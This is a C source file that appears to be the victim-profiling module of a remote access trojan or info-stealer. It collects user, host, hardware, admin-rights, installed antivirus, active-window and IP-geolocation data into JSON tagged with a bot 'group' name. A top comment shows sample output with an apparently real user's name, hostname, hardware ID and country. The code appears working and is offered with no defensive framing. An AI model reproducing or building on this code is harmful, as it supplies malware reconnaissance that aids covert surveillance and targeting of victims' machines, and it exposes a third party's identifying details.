#define _WIN32_DCOM
#include <windows.h>
#include <wbemidl.h>
#include <wbemcli.h>
#include <Shlobj.h>
#include <stdio.h>
#include <bcrypt.h>
#include <wincrypt.h>
#include <ole2.h>
#include <lm.h>
// #include <cJSON/cJSON.h>
#include "system_info.h"
#include "debug_print.h"
#include "requests.h"
// {
//         "username":     "ShoaibxZohaib",
//         "hostname":     "DESKTOP-TN7JBIK",
//         "os":   "Windows 10.0 (Build 19045)",
//         "group":        "SystemGroup",
//         "is_admin":     false,
//         "gpu":  "AMD Radeon R7 200 Series",
//         "cpu":  "Intel(R) Core(TM) i5-2400 CPU @ 3.10GHz",
//         "total_ram_mb": 8150,
//         "hardware_id":  "183211e43a4d2b17c365",
//         "country":      "Pakistan"
// }


char* g_groub = "SystemGroup"; // Global group identifier

// Helper to convert raw bytes to hex
static char* BytesToHex(const BYTE* bytes, DWORD size) {
    char* hexString = (char*)malloc(size * 2 + 1);
    if (!hexString) return NULL;
    for (DWORD i = 0; i < size; i++)
        sprintf_s(hexString + i * 2, 3, "%02x", bytes[i]);
    return hexString;
}

// Convert BSTR to ANSI string
static char* BstrToAnsi(BSTR bstr) {
    if (!bstr) return NULL;
    int len = SysStringLen(bstr);
    int size_needed = WideCharToMultiByte(CP_ACP, 0, bstr, len, NULL, 0, NULL, NULL);
    char* ansi_str = (char*)malloc(size_needed + 1);
    if (!ansi_str) return NULL;
    WideCharToMultiByte(CP_ACP, 0, bstr, len, ansi_str, size_needed, NULL, NULL);
    ansi_str[size_needed] = '\0';
    return ansi_str;
}

// Compute MD5 hash
static BOOL ComputeMD5Hash(LPCSTR text, LPSTR* hash_string) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_HASH_HANDLE hHash = NULL;
    PBYTE pbHashObject = NULL;
    PBYTE pbHash = NULL;
    DWORD cbHashObject = 0, cbData = 0, cbHash = 0;
    BOOL bSuccess = FALSE;

    if (BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_MD5_ALGORITHM, NULL, 0))) {
        BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbHashObject, sizeof(DWORD), &cbData, 0);
        pbHashObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbHashObject);
        BCryptGetProperty(hAlg, BCRYPT_HASH_LENGTH, (PBYTE)&cbHash, sizeof(DWORD), &cbData, 0);
        pbHash = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbHash);

        if (pbHashObject && pbHash) {
            if (BCRYPT_SUCCESS(BCryptCreateHash(hAlg, &hHash, pbHashObject, cbHashObject, NULL, 0, 0))) {
                if (BCRYPT_SUCCESS(BCryptHashData(hHash, (PBYTE)text, (ULONG)strlen(text), 0))) {
                    if (BCRYPT_SUCCESS(BCryptFinishHash(hHash, pbHash, cbHash, 0))) {
                        *hash_string = BytesToHex(pbHash, cbHash);
                        bSuccess = TRUE;
                    }
                }
                BCryptDestroyHash(hHash);
            }
        }
    }

    if (pbHashObject) HeapFree(GetProcessHeap(), 0, pbHashObject);
    if (pbHash) HeapFree(GetProcessHeap(), 0, pbHash);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return bSuccess;
}

// Get Hardware ID
static LPSTR GetHardwareId() {
    char buffer[2048];
    char temp[256];
    DWORD serialNum;
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    DWORD name_len = 256;
    GetComputerNameA(temp, &name_len);
    GetVolumeInformationA("C:\\", NULL, 0, &serialNum, NULL, NULL, NULL, 0);
    sprintf_s(buffer, sizeof(buffer), "%s-%d-%u", temp, sysInfo.dwNumberOfProcessors, serialNum);

    LPSTR hash = NULL;
    if (ComputeMD5Hash(buffer, &hash)) {
        hash[20] = '\0'; // Truncate to 20 chars
        return hash;
    }
    return _strdup("Err HWID");
}

// Execute WMI Query
static BSTR ExecuteWMIQuery(const OLECHAR* query, const OLECHAR* property) {
    IWbemLocator *pLoc = NULL;
    IWbemServices *pSvc = NULL;
    IEnumWbemClassObject* pEnumerator = NULL;
    BSTR result = NULL;

    if (FAILED(CoInitializeEx(0, COINIT_MULTITHREADED))) return NULL;

    if (FAILED(CoCreateInstance(&CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, &IID_IWbemLocator, (LPVOID*)&pLoc))) {
        CoUninitialize(); return NULL;
    }

    BSTR strNetworkResource = SysAllocString(L"ROOT\\CIMV2");
    if (FAILED(pLoc->lpVtbl->ConnectServer(pLoc, strNetworkResource, NULL, NULL, NULL, 0, NULL, NULL, &pSvc))) {
        SysFreeString(strNetworkResource); pLoc->lpVtbl->Release(pLoc); CoUninitialize(); return NULL;
    }
    SysFreeString(strNetworkResource);

    CoSetProxyBlanket((IUnknown*)pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
                      RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);

    BSTR strQuery = SysAllocString(query);
    BSTR strQueryLang = SysAllocString(L"WQL");
    if (FAILED(pSvc->lpVtbl->ExecQuery(pSvc, strQueryLang, strQuery,
            WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnumerator))) {
        SysFreeString(strQueryLang); SysFreeString(strQuery); pSvc->lpVtbl->Release(pSvc); pLoc->lpVtbl->Release(pLoc); CoUninitialize(); return NULL;
    }
    SysFreeString(strQueryLang); SysFreeString(strQuery);

    IWbemClassObject *pclsObj = NULL;
    ULONG uReturn = 0;
    if (pEnumerator) {
        pEnumerator->lpVtbl->Next(pEnumerator, WBEM_INFINITE, 1, &pclsObj, &uReturn);
        if (uReturn) {
            VARIANT vtProp;
            VariantInit(&vtProp);
            pclsObj->lpVtbl->Get(pclsObj, property, 0, &vtProp, 0, 0);
            if (vtProp.vt == VT_BSTR)
                result = SysAllocString(vtProp.bstrVal);
            VariantClear(&vtProp);
            pclsObj->lpVtbl->Release(pclsObj);
        }
        pEnumerator->lpVtbl->Release(pEnumerator);
    }

    pSvc->lpVtbl->Release(pSvc);
    pLoc->lpVtbl->Release(pLoc);
    CoUninitialize();
    return result;
}
static char* GetActiveWindowTitle() {
    HWND hwnd = GetForegroundWindow();
    if (!hwnd) return _strdup("N/A");

    char title[512];
    int len = GetWindowTextA(hwnd, title, sizeof(title));
    if (len > 0)
        return _strdup(title);
    else
        return _strdup("N/A");
}
static char* GetAntivirusJsonValue() {
    IWbemLocator* pLoc = NULL;
    IWbemServices* pSvc = NULL;
    IEnumWbemClassObject* pEnumerator = NULL;
    HRESULT hres;
    char* result = NULL;

    if (FAILED(CoInitializeEx(0, COINIT_MULTITHREADED)))
        return _strdup("Not Installed");

    // Connect to WMI
    hres = CoCreateInstance(&CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER,
                            &IID_IWbemLocator, (LPVOID*)&pLoc);
    if (FAILED(hres)) { CoUninitialize(); return _strdup("Not Installed"); }

    BSTR ns = SysAllocString(L"ROOT\\SecurityCenter2");
    hres = pLoc->lpVtbl->ConnectServer(pLoc, ns, NULL, NULL, NULL, 0, NULL, NULL, &pSvc);
    SysFreeString(ns);
    if (FAILED(hres)) { pLoc->lpVtbl->Release(pLoc); CoUninitialize(); return _strdup("Not Installed"); }

    CoSetProxyBlanket((IUnknown*)pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
                      RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);

    BSTR query = SysAllocString(L"SELECT * FROM AntiVirusProduct");
    BSTR lang = SysAllocString(L"WQL");
    hres = pSvc->lpVtbl->ExecQuery(pSvc, lang, query,
                                   WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
                                   NULL, &pEnumerator);
    SysFreeString(query); SysFreeString(lang);
    if (FAILED(hres)) {
        pSvc->lpVtbl->Release(pSvc);
        pLoc->lpVtbl->Release(pLoc);
        CoUninitialize();
        return _strdup("Not Installed");
    }

    IWbemClassObject* pObj = NULL;
    ULONG ret = 0;
    size_t totalLen = 0;
    char* allNames = NULL;

    while (pEnumerator && pEnumerator->lpVtbl->Next(pEnumerator, WBEM_INFINITE, 1, &pObj, &ret) == S_OK) {
        VARIANT vtProp;
        VariantInit(&vtProp);
        if (SUCCEEDED(pObj->lpVtbl->Get(pObj, L"displayName", 0, &vtProp, 0, 0))) {
            if (vtProp.vt == VT_BSTR) {
                char* ansi = BstrToAnsi(vtProp.bstrVal);
                if (ansi) {
                    size_t newLen = totalLen + strlen(ansi) + 2;
                    char* tmp = (char*)realloc(allNames, newLen);
                    if (tmp) {
                        allNames = tmp;
                        if (totalLen == 0)
                            strcpy(allNames, ansi);
                        else {
                            strcat(allNames, ",");
                            strcat(allNames, ansi);
                        }
                        totalLen = strlen(allNames);
                    }
                    free(ansi);
                }
            }
        }
        VariantClear(&vtProp);
        pObj->lpVtbl->Release(pObj);
    }

    if (!allNames)
        allNames = _strdup("Not Installed");

    if (pEnumerator) pEnumerator->lpVtbl->Release(pEnumerator);
    if (pSvc) pSvc->lpVtbl->Release(pSvc);
    if (pLoc) pLoc->lpVtbl->Release(pLoc);
    CoUninitialize();

    result = allNames;
    return result;
}
cJSON* GetSystemInfoJson() {
    DEBUG_PRINT("Gathering system info...");

    cJSON *root = cJSON_CreateObject();
    if (!root) return NULL;

    // Username
    char username[256];
    DWORD user_len = 256;
    if (GetUserNameA(username, &user_len))
        cJSON_AddStringToObject(root, "username", username);

    // Hostname
    char hostname[256];
    if (gethostname(hostname, sizeof(hostname)) == 0)
        cJSON_AddStringToObject(root, "hostname", hostname);

    // OS version
    OSVERSIONINFOEXW osInfo = { sizeof(OSVERSIONINFOEXW) };
    HMODULE hMod = GetModuleHandleW(L"ntdll.dll");
    if (hMod) {
        typedef LONG(WINAPI* RtlGetVersionPtr)(LPOSVERSIONINFOEXW);
        RtlGetVersionPtr pRtlGetVersion = (RtlGetVersionPtr)GetProcAddress(hMod, "RtlGetVersion");
        if (pRtlGetVersion && pRtlGetVersion(&osInfo) == 0) {
            char osStr[128];
            sprintf_s(osStr, sizeof(osStr), "Windows %lu.%lu (Build %lu)",
                      osInfo.dwMajorVersion, osInfo.dwMinorVersion, osInfo.dwBuildNumber);
            cJSON_AddStringToObject(root, "os", osStr);
        }
    }

    // System group
    cJSON_AddStringToObject(root, "group", g_groub);

    // Admin check
    BOOL isAdmin = IsUserAnAdmin();
    cJSON_AddBoolToObject(root, "is_admin", isAdmin);

    // GPU
    BSTR gpu_bstr = ExecuteWMIQuery(L"SELECT * FROM Win32_VideoController", L"Name");
    char* gpu_ansi = gpu_bstr ? BstrToAnsi(gpu_bstr) : _strdup("N/A");
    cJSON_AddStringToObject(root, "gpu", gpu_ansi ? gpu_ansi : "N/A");
    SysFreeString(gpu_bstr);
    free(gpu_ansi);

    // CPU
    BSTR cpu_bstr = ExecuteWMIQuery(L"SELECT * FROM Win32_Processor", L"Name");
    char* cpu_ansi = cpu_bstr ? BstrToAnsi(cpu_bstr) : _strdup("N/A");
    cJSON_AddStringToObject(root, "cpu", cpu_ansi ? cpu_ansi : "N/A");
    SysFreeString(cpu_bstr);
    free(cpu_ansi);

    // RAM
    MEMORYSTATUSEX memStatus = { sizeof(memStatus) };
    if (GlobalMemoryStatusEx(&memStatus)) {
        long long totalRam = memStatus.ullTotalPhys / (1024 * 1024);
        cJSON_AddNumberToObject(root, "total_ram_mb", totalRam);
    }

    // Hardware ID
    LPSTR hwid = GetHardwareId();
    cJSON_AddStringToObject(root, "hardware_id", hwid ? hwid : "Err HWID");
    free(hwid);

    // Antivirus
    char* av = GetAntivirusJsonValue();
    cJSON_AddStringToObject(root, "antivirus", av ? av : "Not Installed");
    free(av);

    // Active window title
    char* activeWin = GetActiveWindowTitle();
    cJSON_AddStringToObject(root, "active_window", activeWin ? activeWin : "N/A");
    free(activeWin);
    

    // Geolocation from IP
    char* geoJson = GetRequest("https://ipwho.is/?lang=en");
    if (geoJson) {
        cJSON* geo = cJSON_Parse(geoJson);
        if (geo) {
            const cJSON* cc = cJSON_GetObjectItem(geo, "country");
            if (cc && cJSON_IsString(cc))
                cJSON_AddStringToObject(root, "country", cc->valuestring);
            cJSON_Delete(geo);
        }
        free(geoJson);
    }
    return root;
}
